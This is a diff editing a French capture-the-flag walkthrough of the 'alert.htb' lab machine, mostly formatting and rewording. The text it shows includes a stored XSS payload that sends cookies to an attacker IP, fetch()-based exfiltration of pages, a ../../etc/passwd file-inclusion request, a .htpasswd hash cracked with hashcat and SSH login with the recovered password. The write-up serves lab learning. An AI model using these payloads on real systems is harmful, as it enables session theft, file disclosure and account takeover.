@@ -482,11 +482,7 @@ Tu vas donc te concentrer sur ce mécanisme pour comprendre comment les fichiers
 
 Avant de chercher une vulnérabilité, tu dois comprendre comment l’application traite les fichiers.
 
-#### Objectif
-
-Vérifier si le contenu Markdown est correctement interprété.
-
-#### Action
+Tu commences par vérifier si le contenu Markdown est correctement interprété.
 
 Crée un fichier `test.md` avec le contenu suivant :
 
@@ -510,7 +506,7 @@ Le contenu est alors affiché dans l’interface.
 
 > **Note :** un bouton **“Share Markdown”** est également présent sur la page et pourrait permettre de générer un lien de partage du contenu. Cette fonctionnalité sera analysée plus loin.
 
-#### Interprétation
+**Interprétation**
 
 Tu confirmes que :
 
@@ -527,12 +523,6 @@ Si ce n’est pas le cas, cela peut conduire à une vulnérabilité de type **XS
 
 ### Injection XSS dans le Markdown
 
-#### Objectif
-
-Tester si le contenu Markdown est filtré ou s’il permet l’exécution de JavaScript.
-
-#### Action
-
 Modifie ton fichier `test.md` :
 
 ```markdown
@@ -543,13 +533,11 @@ Modifie ton fichier `test.md` :
 
 Puis recharge-le via **“View Markdown”**.
 
-#### Résultat
-
 Une alerte JavaScript s’affiche.
 
 ![Alerte JavaScript déclenchée par une faille XSS dans Markdown Viewer sur alert.htb](xss-alert.png)
 
-#### Interprétation
+**Interprétation**
 
 Cela signifie que :
 
@@ -561,7 +549,7 @@ Tu es face à une **faille XSS (Cross-Site Scripting)**.
 
 Dans ce contexte, il s’agit très probablement d’une **XSS stockée**, car le contenu peut être enregistré et rejoué.
 
-#### Impact
+**Impact**
 
 À ce stade, tu peux :
 
@@ -585,9 +573,7 @@ Maintenant que tu peux exécuter du JavaScript dans le navigateur, l’étape su
 
 L’objectif classique est de récupérer les **cookies de session**, car ils permettent d’identifier un utilisateur connecté.
 
-#### Objectif
-
-Vérifier si tu peux envoyer des données depuis le navigateur vers ta machine.
+Modifie ton fichier `test.md` en y ajoutant une ligne `new Image()` afin de tester l’envoi de données depuis le navigateur vers ta machine.
 
 ```markdown
 # Alert Test
@@ -601,24 +587,20 @@ new Image().src="http://10.10.16.93:8000/?c="+document.cookie;
 
 Cette ligne force le navigateur à effectuer une requête HTTP vers ta machine, en y ajoutant les cookies.
 
-#### Mise en place du listener
-
-Sur ta machine Kali, lance un serveur HTTP :
+Sur ta machine Kali, lance un serveur HTTP pour écouter les requêtes :
 
 ```bash
 python3 -m http.server 8000
 ```
 
-#### Résultat
-
-Après avoir affiché le Markdown, tu observes une requête :
+Après affichage du Markdown, une requête apparaît dans ton listener :
 
 ```bash
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.x.x - - [27/Mar/2026 10:44:40] "GET /?c= HTTP/1.1" 200 -
 ```
 
-#### Interprétation
+**Interprétation**
 
 - Le script est bien exécuté
 - Le navigateur envoie une requête vers ta machine
@@ -632,7 +614,7 @@ C’est normal ici, car tu es dans ton propre contexte (non authentifié).
 
 Pour exploiter pleinement la XSS, tu dois viser un utilisateur ayant plus de droits.
 
-### Observation
+**Information clé**
 
 Sur la page **About us**, une information importante apparaît :
 
@@ -672,13 +654,13 @@ Message sent successfully!
 
 #### Exécution côté administrateur
 
-Quelques instants plus tard, unerequête apparaît dans ton listener :
+Quelques instants plus tard, une requête apparaît dans ton listener :
 
 ```bash
 10.129.x.x - - [date] "GET /?c= HTTP/1.1" 200 -
 ```
 
-#### Interprétation
+**Interprétation**
 
 Cette fois :
 
@@ -686,14 +668,14 @@ Cette fois :
 - ce n’est plus ton navigateur
 - c’est celui de l’administrateur
 
-Cela signifie que :
+Cela signifie que l’administrateur a bien exécuté ton payload :
 
 - il a ouvert ton lien
 - ton Markdown a été affiché
 - ton JavaScript s’est exécuté dans son navigateur
 - la requête a été envoyée depuis sa machine
 
-Tu contrôles maintenant l’exécution de JavaScript dans un contexte administrateur.
+**Tu contrôles maintenant l’exécution de JavaScript dans un contexte administrateur.**
 
 ---
 
@@ -707,17 +689,11 @@ L’idée est simple :
 2. récupérer le contenu
 3. l’envoyer vers ta machine
 
-#### Recherche d’une cible intéressante
-
 Tu dois maintenant identifier une page qui affiche du contenu utile.
 
-Lors de l’énumération, une page attire l’attention :
+Lors de l’énumération du site web, tu identifies une page intéressante : `messages.php`.
 
-messages.php
-
-
-
-#### Pourquoi messages.php ?
+**Pourquoi cette page est intéressante**
 
 - son nom suggère un affichage de messages
 - elle pourrait manipuler des fichiers
@@ -725,19 +701,11 @@ messages.php
 
 **Cela en fait une cible idéale pour tenter une exploitation de type Local File Inclusion (LFI).**
 
-#### Utilisation de `fetch()`
-
 Pour lire une page via le navigateur de l’administrateur, tu peux utiliser `fetch()`.
 
-C’est l’équivalent d’un curl exécuté dans son navigateur.
+Cela revient à exécuter une requête HTTP directement depuis son navigateur.
 
-#### Objectif
-
-Lire le contenu de `messages.php`.
-
-#### Action
-
-Crée un fichier `fetch-test.md` :
+Tu crée un fichier `fetch-test.md` :
 
 ```markdown
 # Message test
@@ -751,23 +719,17 @@ fetch('http://alert.htb/messages.php')
 </script>
 ```
 
-#### Résultat
-
-Tu reçois une requête contenant du Base64 :
+Lorsque l’administrateur ouvre ton lien, une requête contenant du Base64 apparaît dans ton listener :
 
 ```bash
 10.129.231.188 - - [27/Mar/2026 17:07:00] "GET /?d=PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg== HTTP/1.1" 200 -
 ```
 
-#### Décodage
-
-Le contenu est encodé en Base64. Tu peux le décoder avec la commande suivante :
+Tu peux décoder ce contenu avec :
 
 ```bash
 echo "PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg==" | base64 -d
 ```
-
-#### Contenu obtenu
 
 Tu obtiens alors le contenu HTML suivant :
 
@@ -782,7 +744,7 @@ Tu obtiens alors le contenu HTML suivant :
 </ul>
 ```
 
-#### Interprétation (POINT CLÉ)
+**Interprétation (POINT CLÉ)**
 
 👉 Tu viens de découvrir quelque chose d’essentiel :
 
@@ -796,11 +758,11 @@ C’est un point d’entrée potentiel pour une **LFI**
 messages.php?file=...
 ```
 
+Tu es face à un vecteur potentiel de **Local File Inclusion (LFI)**.
+
 ### Confirmation de la lecture d’un fichier
 
-Maintenant, tu vas tester si tu peux lire un fichier système.
-
-#### Action
+Tu vas maintenant vérifier si tu peux lire un fichier système via la `Local File Inclusion (LFI)`.
 
 Crée `fetch-files.md` :
 
@@ -817,9 +779,9 @@ fetch('http://alert.htb/messages.php?file=../../../../etc/passwd')
 </script>
 ```
 
-#### Résultat
+**Résultat**
 
-Tu reçois du contenu encodé.
+Une requête contenant du contenu encodé apparaît dans ton listener :
 
 ```bash
 10.129.xxx.xxx - - [date] "GET /?d=PHByZT5yb290Ong6MDow...
@@ -836,13 +798,13 @@ david:x:1001:1002:,,,:/home/david:/bin/bash
 </pre>
 ```
 
-#### Interprétation
+**Interprétation (POINT CLÉ)**
 
 - tu peux lire des fichiers locaux
 - l’accès se fait via le navigateur admin
 - le contenu est exfiltré
 
-**Tu confirmes une vulnérabilité de type Local File Inclusion (LFI), exploitable grâce à la XSS.**
+**Tu confirmes une vulnérabilité de type Local File Inclusion (LFI), exploitable via la XSS.**
 
 ---
 
@@ -850,92 +812,53 @@ david:x:1001:1002:,,,:/home/david:/bin/bash
 
 À ce stade, tu peux lire des fichiers locaux sur le serveur via la LFI.
 
-**Après avoir confirmé la LFI, tu peux maintenant cibler des fichiers sensibles du système, notamment des fichiers de configuration.**
+Tu peux donc cibler directement des fichiers sensibles, en particulier les fichiers de configuration.
 
-#### Objectif
-
-Identifier des fichiers contenant :
-
-- des chemins sensibles
-- des informations d’authentification
-- des éléments exploitables pour la suite
-
----
-
-### Exploration de la configuration Apache
-
-Un bon réflexe consiste à analyser la configuration du serveur web.
-
-
-
-#### Action
+Un bon réflexe consiste à analyser la configuration Apache.
 
 Tu récupères le fichier :
 
+```bash
 /etc/apache2/apache2.conf
+```
 
-
-
-#### Résultat
-
-Tu identifies la directive suivante :
-
-IncludeOptional sites-enabled/*.conf
-
-
-
-#### Interprétation
-
-Cette ligne indique que la configuration des virtual hosts est chargée depuis :
+Tu identifies notamment la directive suivante :
 
 ```bash
-# Include the virtual host configurations:
 IncludeOptional sites-enabled/*.conf
 ```
 
-Tu sais maintenant où chercher des informations intéressantes.
+Cela indique que la configuration des virtual hosts est chargée depuis ce répertoire.
 
-### Analyse des VirtualHosts
-
-#### Action
-
-Tu lis le fichier :
+Tu poursuis donc avec :
 
 ```bash
 /etc/apache2/sites-enabled/000-default.conf
 ```
 
----
-
-#### Résultat
-
-Tu identifies une directive importante :
+Dans ce fichier, une directive attire ton attention :
 
 ```bash
 AuthUserFile /var/www/statistics.alert.htb/.htpasswd
 ```
 
-#### Interprétation (POINT CLÉ)
+**Interprétation (POINT CLÉ)**
 
-Cette ligne indique :
+Cette configuration révèle plusieurs éléments importants :
 
-- l’utilisation d’une authentification HTTP Basic
-- la présence d’un fichier `.htpasswd`
-- un chemin local accessible via ta LFI
+- une authentification HTTP Basic est utilisée
+- un fichier `.htpasswd` est présent
+- son chemin est accessible via ta LFI
 
 **Ce type de fichier est particulièrement intéressant en CTF, car il contient souvent des identifiants directement exploitables.**
 
 ### Lecture du fichier `.htpasswd`
 
-#### Action
+Tu récupères donc son contenu via la LFI :
 
-Tu adaptes ton payload pour lire le fichier :
-
+```bash
 /var/www/statistics.alert.htb/.htpasswd
-
-
-
-#### Résultat
+```
 
 Après exfiltration et décodage :
 
@@ -943,24 +866,14 @@ Après exfiltration et décodage :
 albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
 ```
 
-Ce format correspond à un fichier `.htpasswd`, utilisé pour l’authentification HTTP Basic.
-
-On identifie :
+Tu identifie :
 
 - utilisateur : `albert`
 - hash : `$apr1$` (MD5 Apache)
 
 Nous allons maintenant tenter de casser ce hash afin d’obtenir les identifiants en clair.
 
-### Cracking du hash `.htpasswd`
-
-#### Objectif
-
-Retrouver le mot de passe en clair.
-
-
-
-#### Action
+Tu peux maintenant tenter de casser ce hash pour obtenir le mot de passe en clair.
 
 Tu places le hash dans un fichier :
 
@@ -968,23 +881,15 @@ Tu places le hash dans un fichier :
 echo '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' > hash.txt
 ```
 
-Puis tu utilises `hashcat` :
+Puis tu lances `hashcat` :
 
 ```bash
 hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-
-
-#### Résultat
-
 Le mot de passe est retrouvé :
 
 `manchesterunited`
-
-
-
-#### Interprétation
 
 Tu obtiens les identifiants complets :
 
@@ -1004,33 +909,30 @@ Tu testes en SSH :
 ssh albert@alert.htb
 ```
 
-#### Résultat
-
 L’authentification fonctionne.
 
 **On obtient ainsi un accès SSH en tant qu’utilisateur `albert`.**
 
-### Accès utilisateur
+### Récupération du flag
 
-Une fois connecté en SSH, on vérifie notre contexte :
+Une fois connecté en SSH, vérifie le contexte :
 
-```
+```bash
 id
 uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
 ```
 
-#### Interprétation
+> Note  que l’utilisateur appartient au groupe `management`, cela pourrait t'être utile pour la suite.
 
-L’utilisateur appartient au groupe `management`, ce qui pourrait être utile pour la suite.
+Tu listes les fichiers :
 
-#### Récupération du flag
 
 ```bash
 ls -l
 -rw-r----- 1 root albert 33 Mar 29 13:19 user.txt
 ```
 
-
+Puis tu récupères le flag :
 
 ```bash
 cat user.txt
@@ -1041,20 +943,22 @@ cat user.txt
 
 ### Conclusion de la prise pied
 
-Tu as obtenu un accès SSH valide en exploitant une chaîne complète de vulnérabilités web, allant d’un upload de fichier à une XSS stockée, puis à une LFI, jusqu’à la récupération et réutilisation de credentials :
+Tu as obtenu un accès SSH valide en exploitant une chaîne complète de vulnérabilités web :
 
 - upload de fichier Markdown
 - XSS stockée
 - exécution dans le navigateur administrateur
-- exfiltration via JavaScript
-- LFI via `messages.php`
+- exfiltration de contenu via JavaScript
+- exploitation d’une LFI via `messages.php`
 - récupération d’un fichier `.htpasswd`
 - cracking du hash
-- réutilisation des identifiants
+- réutilisation des identifiants en SSH
 
-Cette chaîne d’exploitation te permet de récupérer le flag utilisateur et confirme la réussite de la prise pied sur la machine.
+Cette chaîne d’exploitation te permet d’obtenir un accès en tant qu’utilisateur `albert` et de récupérer le flag utilisateur.
 
-Tu peux maintenant passer à la phase d’énumération locale en vue d’une élévation de privilèges.
+**La prise de pied est réussie. Tu contrôles maintenant un accès SSH sur la machine.**
+
+Tu peux maintenant passer à l’énumération locale afin d’identifier des vecteurs d’élévation de privilèges.
 
 ---
 
